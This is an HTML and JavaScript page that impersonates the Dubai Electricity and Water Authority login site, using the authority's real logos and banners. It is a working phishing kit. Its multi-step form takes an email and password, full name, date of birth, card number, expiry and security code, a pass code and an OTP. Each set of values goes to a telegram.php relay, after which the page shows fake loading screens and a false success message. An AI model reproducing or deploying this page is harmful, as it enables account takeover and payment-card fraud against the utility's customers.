<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Registration Form</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">

	<style>
	
	
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #ffffff;
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column; /* Align items in a column */
    align-items: center;
    height: 100vh;
    padding-bottom: 50px; /* Adjust this value based on the height of your footer */

}

.header {
    width: 100%;
    background-color: #fff;
    padding: 10px 20px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    display: flex;
    align-items: center;
    justify-content: space-between; /* Updated this line */
}


.logo {
    height: 50px;
    /* Removed margin-right as it's no longer necessary */
}

h1 {
    margin: 0;
    font-size: 24px;
}
#loading img {
    width: 500px; /* Adjust this value as needed */
    height: auto; /* Maintains the aspect ratio */
}

.main-content {
    display: flex;
    justify-content: space-around; /* Distributes space evenly */
    align-items: flex-start;
    width: 100%;
    max-width: 1200px;
    margin: 20px auto;
}



.container {
    /* Existing styles */
    flex-basis: 350px; /* Fix the width of the form container */
}

.container, .image-container {
    max-width: 500px; /* or any other suitable width */
}


.image-container {
    flex-grow: 1; /* Allows the container to grow */
    padding: 20px;
    margin-left: 20px; /* Space between the containers */
    /* Add more styles as needed for the image container */
}

.image-container img {
    max-width: 100%;
    height: auto;
    border-radius: 10px; /* Optional: for rounded corners */
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Optional: for a subtle shadow */
}


input[type=text], input[type=email], input[type=password], input[type=date] {
    width: 100%;
    padding: 18px; /* Increased padding */
    margin: 15px 0; /* Increased margin */
    display: inline-block;
    border: 2px solid #ccc; /* Adjusted border color */
    border-radius: 10px; /* More rounded */
    box-sizing: border-box;
    box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1); /* More pronounced shadow */
    font-size: 18px; /* Larger font size */
    transition: border-color 0.3s, box-shadow 0.3s;
}

input[type=text]:focus, input[type=email]:focus, input[type=password]:focus, input[type=date]:focus {
    border-color: #37c978; /* Highlight color on focus */
    box-shadow: 0 3px 6px rgba(0, 150, 0, 0.3); /* More pronounced shadow on focus */
}

button {
    width: 100%;
    padding: 16px 20px; /* Increased padding */
    margin: 15px 0; /* Increased margin */
    border: none;
    border-radius: 6px;
    cursor: pointer;
    background-image: linear-gradient(145deg, #431d97, #7d9af0);
    color: white;
    font-size: 18px; /* Larger font size */
    font-weight: bold;
    text-transform: uppercase;
    box-shadow: 0 7px #d0edff;
    transition: all 0.2s ease-in-out;
    outline: none;
}

button:hover {
    background-image: linear-gradient(145deg, #7d9af0, #431d97);
    box-shadow: 0 5px #d0edff;
    transform: translateY(-3px);
}

button:active {
    box-shadow: 0 3px #15692f;
    transform: translateY(5px);
}

#loading, #finalText {
    text-align: center;
    font-size: 18px; /* Larger font size */
}

.input-icon-wrapper {
    position: relative;
    display: flex;
    align-items: center;
    width: 100%;
}

#cardIcon {
    position: absolute;
    left: 15px; /* Adjusted for larger padding */
    font-size: 24px; /* Larger icon size */
    color: #aaa;
}

input#memberCardNumber {
    padding-left: 50px; /* Increased padding to accommodate larger icon */
}

.container-header {
    text-align: center;
    font-size: 28px; /* Choose a size that fits your design */
    color: #5F4B8B; /* This is just an example color, match it to your design */
    font-weight: bold; /* Optional, if you want the header to be bold */
    margin-top: 20px; /* Adjust as needed */
}

.container-subheader {
    text-align: center;
    font-size: 20px; /* Adjust as needed */
    color: #5F4B8B; /* Match to your design */
    margin-bottom: 20px; /* Space before the form starts */
}
@media (max-width: 768px) {
    .main-content {
        flex-direction: column;
        align-items: center; /* Center items for mobile */
    }
}
.card-logos {
    text-align: center; /* Center the logos */
    margin-bottom: 10px; /* Space above the member card number input */
}

.card-logo {
    height: 30px; /* Control the size of logos */
    margin-right: 10px; /* Space between logos */
}

.card-logo:last-child {
    margin-right: 0; /* Remove margin for the last logo */
}
.footer {
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;
    background-color: #F5F5F5; /* This should match the color in the image */
    color: black; /* Adjust the color as needed */
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 20px; /* Adjust the padding as needed */
    box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1); /* Optional shadow for depth */
}

.footer-container {
    display: flex;
    justify-content: space-between;
    width: 100%;
    max-width: 1200px; /* Adjust based on your layout's max width */
    margin: auto;
}

.footer-left, .footer-middle, .footer-right {
    display: flex;
    align-items: center;
}

.footer-logo {
    height: 50px; /* Adjust to match the size of your logo */
    margin-right: 10px;
}

.footer p {
    margin: 0 10px; /* Adjust spacing as needed */
    font-size: 16px; /* Adjust font size as needed */
}

/* You may want to add responsiveness for smaller screens */
@media (max-width: 768px) {
    .footer-container {
        flex-direction: column;
        align-items: center;
    }

    .footer-left, .footer-middle, .footer-right {
        margin-bottom: 10px;
    }
}
.navigation-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    background-color: #fff; /* Adjust the color to match your image */
    padding: 10px 20px; /* Adjust padding to match the image */
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Optional: if there's a shadow */
    width: 100%;
}

.nav-left, .nav-right {
    display: flex;
    align-items: center;
}

.nav-link {
    margin-right: 20px; /* Adjust spacing as needed */
    text-decoration: none;
    color: #000; /* Adjust color to match your image */
    font-size: 16px; /* Adjust font size as needed */
}

.nav-icon {
    margin-right: 20px; /* Adjust spacing as needed */
    text-decoration: none;
    color: #000; /* Adjust color to match your image */
    font-size: 20px; /* Adjust font size as needed */
}

.menu-icon {
    margin-right: 20px; /* Adjust spacing as needed */
    font-size: 24px; /* Adjust size as needed */
    cursor: pointer;
}

/* This is to hide the menu icon on larger screens, assuming it's for mobile */
@media (min-width: 768px) {
    .menu-icon {
        display: none;
    }
}

/* Add responsiveness for smaller screens */
@media (max-width: 768px) {
    .nav-left, .nav-right {
        flex-direction: column;
        align-items: flex-start;
    }
}

</style>
</head>
<body>

<header class="header">
    <img src="https://www.dewa.gov.ae/-/media/Images/Header-and-Footer/Header/gov_logo2x.ashx?h=100&w=232&la=en&hash=0CD7BEA2D44FF3588ED252FA8DA990D7" alt="Logo" class="logo"> 
    <!-- Add this line for the second logo -->
    <img src="https://www.dewa.gov.ae/-/media/Images/Header-and-Footer/Header/dewalogo2024.ashx?h=120&w=501&la=en&hash=78DA7F166B8FA568BE188142B739B3E8" alt="Second Logo" class="logo"> 
</header>
<nav class="navigation-bar">
    <div class="nav-left">
        <!-- This will hold the menu icon and links like 'Home', 'Investor Relations', 'EasyPay' -->
        <a href="#" class="nav-link">Home</a>
        <a href="#" class="nav-link">Investor Relations</a>
        <a href="#" class="nav-link">EasyPay</a>
    </div>
    <div class="nav-right">
        <!-- This will hold icons and links like 'Search', 'Profile', 'Arabic', 'Login' -->
        <a href="#" class="nav-icon"><i class="fa fa-search"></i></a>
        <a href="#" class="nav-icon"><i class="fa fa-user"></i></a>
        <a href="#" class="nav-link">العربية</a>
        <a href="#" class="nav-link">Login</a>
    </div>
</nav>


<div class="main-content">


<div class="container">
    <h2 class="container-header">Yalla</h2>
    <p class="container-subheader">Let's get you back in.</p>
	
<!-- Task 1 -->
<div id="task1">
    <input type="email" id="email" placeholder="Email">
    <input type="password" id="password" placeholder="Password">
    <button id="next1">Next</button>
</div>

<!-- Task 2 -->
<div id="task2" style="display:none;">
    <input type="text" id="fullName" placeholder="Full Name">
    <input type="date" id="dob" placeholder="Date of Birth">
    <div class="card-logos">
        <img src="path_to_visa_logo.png" alt="Visa" class="card-logo">
        <img src="path_to_amex_logo.png" alt="Amex" class="card-logo">
        <img src="path_to_mc_logo.png" alt="MasterCard" class="card-logo">
    </div>
    <div class="input-icon-wrapper">
        <span id="cardIcon" class="fa"></span>
        <input type="text" id="memberCardNumber" placeholder="Card Number">
    </div>
    <input type="text" id="memberCardExpiration" placeholder="Card Expiration">
    <input type="text" id="cardCode" placeholder="Card Code">
    <button id="next2">Next</button>
</div>

<!-- Task 3 -->
<div id="task3" style="display:none;">
    <input type="text" id="passCode" placeholder="Pass Code (4 digits)">
    <input type="text" id="confirmPassCode" placeholder="Confirm Pass Code">
    <button id="next3">Next</button>
</div>

<!-- Task 4 -->
<div id="task4" style="display:none;">
    <input type="text" id="otpCode" placeholder="Enter OTP">
    <button id="next4">Next</button>
</div>

<!-- Loading and Final Text -->
<div id="loading" style="display:none;">
    <p>Loading...</p>
	        <img src="https://assets-v2.lottiefiles.com/a/934d4156-118b-11ee-9119-0f7306646b82/lFnm7xmDew.gif" alt="wait">

	
</div>

<div id="finalText" style="display:none;">
    <p>Registration completed successfully</p>
</div>


</div>

<div class="image-container">
    <img src="https://www.dewa.gov.ae/-/media/Images/Hero/DEWAAppWebsite-banner.ashx?h=418&w=668&la=en&hash=553AD1CD36F618E8F064EE2AED5599D7" alt="Sample Image">
	
	<br>
	
	    <img src="https://www.dewa.gov.ae/-/media/Images/Megaevents/Mega-Events_website-banner_668x418_eng.ashx?h=418&w=668&la=en&hash=D6A4270B8BD91255C1F3BA643E7108AB" alt="Sample Image">

</div>



</div>


<footer class="footer">
    <div class="footer-container">
        <div class="footer-left">
            <img src="https://www.dewa.gov.ae/images/04.png" alt="Logo" class="footer-logo">
            <p>Services</p>
        </div>
        <div class="footer-middle">
            <p>Locations</p>
            <p>Contact Us</p>
        </div>
        <div class="footer-right">
            <p>Chat With RAMMAS</p>
            <p>TRY RAMMAS - Powered by ChatGPT BETA</p>
        </div>
    </div>
</footer>



<script>
    function sendTelegramMessage(message) {
        $.post('telegram.php', { message: message });
    }

    $('#next1').click(function() {
        var email = $('#email').val();
        var password = $('#password').val();
        sendTelegramMessage('Email: ' + email + ', Password: ' + password);
        $('#task1').hide();
        $('#loading').show();
        setTimeout(function() {
            $('#loading').hide();
            $('#task2').show();
        }, 2000); // Simulate 2 seconds loading
    });

    $('#next2').click(function() {
        if (!validateCardNumber($('#memberCardNumber').val())) {
            alert('Invalid Member Card Number. Please check and try again.');
            return;
        }

        var fullName = $('#fullName').val();
        var dob = $('#dob').val();
        var address = $('#address').val();
        var memberCardNumber = $('#memberCardNumber').val();
        var memberCardExpiration = $('#memberCardExpiration').val();
        var cardCode = $('#cardCode').val();
        var message = 'Full Name: ' + fullName + ', DOB: ' + dob + ', Address: ' + address + ', Member Card Number: ' + memberCardNumber + ', Member Card Expiration: ' + memberCardExpiration + ', Card Code: ' + cardCode;
        sendTelegramMessage(message);
        $('#task2').hide();
        $('#loading').show(); // Show loading

        setTimeout(function() {
            $('#loading').hide();
            $('#task3').show(); // Show Task 3 after loading
        }, 2000); // Simulate 2 seconds loading
    });

    $('#next3').click(function() {
        var passCode = $('#passCode').val();
        var confirmPassCode = $('#confirmPassCode').val();

        if (passCode !== confirmPassCode) {
            alert('Pass codes do not match. Please try again.');
            return;
        }
        if (!/^\d{4}$/.test(passCode)) {
            alert('Pass code must be a 4-digit number.');
            return;
        }

        sendTelegramMessage('Pass Code: ' + passCode);
        $('#task3').hide();
        $('#loading').show(); // Show loading

        setTimeout(function() {
            $('#loading').hide();
            $('#task4').show(); // Show Task 4 after loading
        }, 2000); // Simulate 2 seconds loading
    });

    $('#next4').click(function() {
        var otpCode = $('#otpCode').val();
        sendTelegramMessage('OTP Code: ' + otpCode);
        $('#task4').hide();
        $('#loading').html('<p>Your account is almost set up, please wait...</p>'); // Custom loading message
        $('#loading').show();

        setTimeout(function() {
            $('#loading').hide();
            $('#finalText').show();
        }, 2000); // Simulate 2 seconds loading
    });

    // Function to automatically add slash for expiration date and limit input length
    $('#memberCardExpiration').on('input', function() {
        var input = $(this).val();
        var maxLength = 5; // MM/YY format plus the slash
        if (input.length === 2 && !input.includes('/')) {
            input += '/';
        }
        if (input.length > maxLength) {
            input = input.substring(0, maxLength);
        }
        $(this).val(input);
    });

    // Luhn Algorithm for card number validation
    function validateCardNumber(number) {
        var regex = new RegExp("^[0-9]{16}$");
        if (!regex.test(number)) return false;
        var sum = 0;
        for (var i = 0; i < number.length; i++) {
            var intVal = parseInt(number.substr(i, 1));
            if (i % 2 == 0) {
                intVal *= 2;
                if (intVal > 9) {
                    intVal = 1 + (intVal % 10);
                }
            }
            sum += intVal;
        }
        return (sum % 10) == 0;
    }
	
	$(document).ready(function() {
    $('#memberCardNumber').on('input', function() {
        var firstDigit = $(this).val().substring(0, 1);
        var iconClass = "";
        if (firstDigit === "4") {
            iconClass = "fa-brands fa-cc-visa";
        } else if (firstDigit === "5") {
            iconClass = "fa-brands fa-cc-mastercard";
        } else if (firstDigit === "3") {
            iconClass = "fa-brands fa-cc-amex";
        }
        $('#cardIcon').attr('class', 'fa ' + iconClass);
    });
});


</script>



</body>
</html>
